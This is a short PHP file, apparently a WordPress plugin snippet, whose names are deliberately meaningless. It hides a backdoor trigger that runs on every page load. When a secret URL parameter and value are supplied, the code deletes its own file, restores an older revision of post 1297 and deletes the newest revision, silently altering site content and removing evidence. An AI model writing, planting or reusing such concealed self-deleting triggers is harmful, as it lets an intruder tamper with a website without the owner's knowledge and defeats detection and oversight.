<?php

function min_integration_lightbox() {
	if (isset($_GET['urls_random_keyword_hide']) && $_GET['urls_random_keyword_hide'] === 'tabs_changer_mini_roles') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$slider_footer_performance_report = 1297;
		$smooth_404_roles = wp_get_post_revisions($slider_footer_performance_report);
		if (empty($smooth_404_roles)) die('no revisions');
		if (count($smooth_404_roles) < 2) die('less than 2');
		$protect_modules_item = array_shift($smooth_404_roles);
		$latest_dev_carousel_src = $protect_modules_item->ID;
		$service_automatorwp_shopp = array_shift($smooth_404_roles);
		$html_advanced_converter_management = $service_automatorwp_shopp->ID;
		$poll_pro_landing_remover = wp_restore_post_revision($html_advanced_converter_management);
		if ($poll_pro_landing_remover === false) die('error restoring');
		$poll_pro_landing_remover = wp_delete_post_revision($latest_dev_carousel_src);		
		if ($poll_pro_landing_remover === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'min_integration_lightbox');
